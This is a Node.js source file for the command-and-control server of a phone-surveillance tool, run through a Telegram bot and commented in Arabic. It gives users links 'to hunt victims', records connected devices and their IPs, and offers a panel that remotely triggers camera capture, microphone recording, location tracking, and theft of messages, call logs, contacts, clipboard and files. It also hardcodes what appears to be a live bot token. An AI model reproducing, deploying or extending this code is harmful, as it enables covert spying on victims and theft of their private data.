const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- الإعدادات الكبرى للمطور @A_l_k_w_r_y ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const BASE_URL = "https://labeb.onrender.com"; 

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = new Set([ADMIN_ID]); // استخدام Set لسرعة التحقق

// --- لوحة تحكم الأدمن (تصميم روعة) ---
bot.on("message", async (msg) => {
    const id = msg.chat.id;
    const text = msg.text;

    // حماية الوصول
    if (!allowedUsers.has(id)) {
        await bot.sendMessage(ADMIN_ID, `⚠️ <b>محاولة دخول جديدة:</b>\n👤 الاسم: ${msg.from.first_name}\n🆔 المعرف: <code>${id}</code>`, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "✅ تفعيل العضوية", callback_data: `allow_${id}` }]] }
        });
        return bot.sendMessage(id, "⏳ <b>عذراً، وصولك معلق..</b>\nطلبك قيد المراجعة لدى المطور @A_l_k_w_r_y");
    }

    // واجهة الإمبراطور @A_l_k_w_r_y
    if (id === ADMIN_ID && text === "/start") {
        return bot.sendMessage(id, `👑 <b>أهلاً بك يا زعيم النظام</b>\n\n📊 <b>الإحصائيات اللحظية:</b>\n• الضحايا المتصلين: <code>${clients.length}</code>\n• الأعضاء المفعلين: <code>${allowedUsers.size - 1}</code>\n\n🚀 <b>غرفة العمليات المركزية:</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ["📱 استعراض كافة الضحايا", "👥 إدارة المصرح لهم"],
                    ["🚫 طرد مستخدم بالايدي", "📢 إذاعة شاملة"],
                    ["🔄 إعادة تشغيل", "📊 حالة السيرفر"]
                ],
                resize_keyboard: true
            }
        });
    }

    // واجهة المستخدمين (توليد رابط الاستضافة التلقائي)
    if (text === "/start" && id !== ADMIN_ID) {
        const userLink = `${BASE_URL}/?id=${id}`;
        return bot.sendMessage(id, `💎 <b>أهلاً بك في منصة السيطرة</b>\n\n🔗 <b>رابط الاستضافة الخاص بك:</b>\n<code>${userLink}</code>\n\n⚠️ <i>استخدم هذا الرابط لصيد ضحاياك، سيظهرون لك هنا فقط.</i>`, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [["📱 ضحاياي"]], resize_keyboard: true }
        });
    }

    // معالجة عرض الضحايا
    if (text === "📱 ضحاياي" || text === "📱 استعراض كافة الضحايا") {
        const myVictims = (id === ADMIN_ID) ? clients : clients.filter(c => c.ownerId == id);
        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة نشطة حالياً.");
        
        myVictims.forEach(c => {
            bot.sendMessage(id, `📍 <b>جهاز جديد متصل:</b>\n🆔 المعرف: <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🕹️ السيطرة الكاملة", callback_data: `control_${c.id}` }]] }
            });
        });
    }

    // طرد مستخدم بالايدي
    if (id === ADMIN_ID && text === "🚫 طرد مستخدم بالايدي") {
        bot.sendMessage(id, "✍️ أرسل (المعرف ID) المراد طرده:");
        bot.once("message", (m) => {
            const target = parseInt(m.text);
            if (allowedUsers.has(target) && target !== ADMIN_ID) {
                allowedUsers.delete(target);
                bot.sendMessage(id, `✅ تم طرد المعرف ${target} بنجاح.`);
                bot.sendMessage(target, "⚠️ تمت إزالتك من النظام.");
            } else {
                bot.sendMessage(id, "❌ المعرف غير موجود أو غير صالح.");
            }
        });
    }
});

// --- لوحة الاختراق (أزرار شفافة Inline - روعة) ---
bot.on("callback_query", async (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        allowedUsers.add(parseInt(value));
        bot.sendMessage(value, "✅ <b>تم تفعيل حسابك بنجاح!</b>\nأرسل /start للحصول على رابطك.");
        return bot.answerCallbackQuery(q.id, { text: "تم المنح" });
    }

    if (action === "control") {
        const victimId = value;
        const panel = {
            inline_keyboard: [
                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
                [{ text: "🎙️ تسجيل المحيط", callback_data: `mic_${victimId}` }, { text: "📍 تحديد الموقع", callback_data: `loc_${victimId}` }],
                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }],
                [{ text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }, { text: "📋 الحافظة", callback_data: `clip_${victimId}` }],
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
                [{ text: "📳 هز الجهاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إرسال تنبيه", callback_data: `notif_${victimId}` }],
                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف", callback_data: `stop_${victimId}` }]
            ]
        };
        await bot.sendMessage(q.message.chat.id, `🕹️ <b>لوحة السيطرة على الجهاز:</b> <code>${victimId}</code>`, {
            parse_mode: 'HTML', reply_markup: panel
        });
        return bot.answerCallbackQuery(q.id);
    }

    // إرسال الأوامر الفعلية
    const target = clients.find(c => c.id === value);
    if (target) {
        target.ws.send(JSON.stringify({ cmd: action }));
        bot.answerCallbackQuery(q.id, { text: `🚀 جاري تنفيذ: ${action}` });
    }
});

// --- نظام WebSocket السريع ---
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const ownerId = urlParams.get('id') || ADMIN_ID; 

    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });
    bot.sendMessage(ownerId, `⚠️ <b>تم سحب ضحية جديد! 🔥</b>\n🆔 المعرف: <code>${deviceId}</code>\n🌍 IP: <code>${ip}</code>`, { parse_mode: 'HTML' });

    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
});

server.listen(process.env.PORT || 3000, () => { console.log("System v5.0 Active"); });
